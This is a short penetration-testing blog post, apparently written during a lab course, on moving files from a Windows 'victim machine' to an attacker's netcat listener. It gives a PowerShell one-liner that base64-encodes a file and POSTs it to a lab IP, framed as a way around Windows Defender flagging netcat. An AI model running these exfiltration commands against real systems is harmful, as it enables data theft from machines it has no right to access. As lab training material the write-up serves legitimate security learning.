---
layout: post
title: Powershell - Transfer Files
---

While busy with the [PACES](https://www.pentesteracademy.com/gcb) lab, I had to figure out a way to upload files to my attack machine.  I couldn't use tools like Netcat (nc.exe), because Windows Defender now picks this up as a malicious program.

I know of various methods to get files onto a victim machine, but in the past I've been able to rely on a limited number of methods to get files from the victim machine.

I came across this interesting usage of Invoke-WebRequest to send files to my attack machine that has Netcat to capture the file.

## TL;DR

### Attack machine

```bash
nc -l -p 443 > file.b64
```

### Victim machine

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '.\file.zip' -Encoding Byte));
Invoke-WebRequest -Uri http://10.0.2.6:443 -Method POST -DisableKeepAlive -Timeout 15 -Body $b64;
```

### Attack machine

```bash
cat file.b64 | sed -n '8,$'p | base64 -d > file.zip
```

## Setup a file to upload

Let's setup a test file that we can use to transfer.

![](/assets/2022-02-22-09-04-11.png)

## Setup Kali to receive file

```bash
nc -l -p 443 > file.b64
```

## The Powershell command

First I get the contents of the file into a variable, after encoding it to Base64.  This makes the file bigger, but you don't need to deal with strange encoding issues with Invoke-WebRequest.

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '.\file.zip' -Encoding Byte))
```

![](/assets/2022-02-22-09-17-37.png)

Now we are ready to send the content of the file to our listening attacker machine running `nc`.

```powershell
Invoke-WebRequest -Uri http://10.0.2.6:443 -Method POST -DisableKeepAlive -Timeout 15 -Body $b64
```

I put the Timeout parameter in, because otherwise the connection just stays open, because `nc` never "closes" it.

## Original file

Once we have the file, we need to convert the Base64 back into the original encoding, i.e. the zip file.

This command takes the Base64 we received, reads the body part, decodes it and puts the content back into a zip file.

```bash
cat file.b64 | sed -n '8,$'p | base64 -d > file.zip
```
